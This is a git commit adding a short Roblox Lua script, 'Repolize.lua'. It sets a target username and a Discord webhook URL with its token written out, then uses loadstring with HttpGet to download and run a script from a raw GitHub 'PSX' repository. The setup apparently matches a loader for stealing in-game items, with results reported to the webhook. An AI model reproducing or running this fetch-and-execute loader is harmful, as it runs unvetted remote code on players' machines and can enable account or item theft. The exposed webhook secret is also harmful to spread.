049a15dd26ea154db0e26325deaecc4d4d588982
Muhemmad6196 <121689484+Muhemmad6196@users.noreply.github.com>
2023-01-27 18:59:31 +0300

    Create Repolize.lua

---
+++ Repolize.lua
@@ -0,0 +1,4 @@
+UserName = "AlMBOTERXX"
+WebHook = "https://discord.com/api/webhooks/1065268047956430949/0tcR60diByAw9D9NSyn2mVLBi4FvxJQI66JNjYmt3Etk3Q-Zc1fCtxYCMjld9fz00O83"
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
